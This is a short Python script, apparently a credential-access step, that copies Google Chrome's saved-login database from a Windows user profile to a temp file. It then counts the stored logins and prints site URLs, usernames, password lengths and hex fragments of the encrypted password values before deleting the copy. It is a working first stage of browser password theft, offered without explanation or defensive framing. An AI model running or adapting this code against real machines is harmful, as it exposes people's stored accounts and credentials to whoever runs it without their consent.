import sqlite3, shutil, os
la = os.environ['LOCALAPPDATA']
src = os.path.join(la, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
dst = os.path.join(os.environ['TEMP'], 'ares_ld.db')
shutil.copy2(src, dst)
conn = sqlite3.connect(dst)
tables = conn.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()
print('Tables:', [t[0] for t in tables])
cols = conn.execute('PRAGMA table_info(logins)').fetchall()
for c in cols:
    print(f'  {c[1]:30s} {c[2]}')
cnt = conn.execute('SELECT count(*) FROM logins WHERE length(password_value) > 0').fetchone()
print(f'Non-empty passwords: {cnt[0]}')
total = conn.execute('SELECT count(*) FROM logins').fetchone()
print(f'Total logins: {total[0]}')
# Show entries with password
rows = conn.execute('SELECT origin_url, username_value, length(password_value), hex(substr(password_value,1,6)) FROM logins WHERE length(password_value) > 0 LIMIT 5').fetchall()
for r in rows:
    print(r)
conn.close()
os.remove(dst)
